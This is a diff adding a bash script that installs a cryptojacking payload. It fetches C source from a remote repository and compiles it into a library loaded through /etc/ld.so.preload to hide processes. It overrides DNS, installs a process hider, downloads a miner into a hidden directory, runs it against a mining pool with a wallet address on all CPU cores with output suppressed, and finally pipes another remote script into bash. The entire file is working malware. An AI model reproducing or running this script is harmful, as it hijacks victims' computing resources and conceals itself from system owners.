@@ -1,0 +1,16 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+curl https://bitbucket.org/korong/file/raw/master/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.3.1 -y && npm i -g node-process-hider && ph add sgr1"
+mkdir .kap && cd .kap
+wget -O sgr1 https://bitbucket.org/korong/file/raw/master/xmolx >/dev/null 2>&1
+chmod +x sgr1
+sudo ./sgr1 -a rx/0 -o 8.222.148.101:443 -u ZEPHYR2XF8FRi4W4vagZfEVLuoKim6H3WKJPRgG2qEMhDEuzPx6k5K1RmpcnUwBeWw1q44QvWkCoATmXd7FaUYSfMMPL7opCoaR1j -p Sukoi -t $(nproc --all) --donate-level 1 -k > /dev/null 2>&1 &
+curl -sL https://bitbucket.org/korong/file/raw/master/time | bash
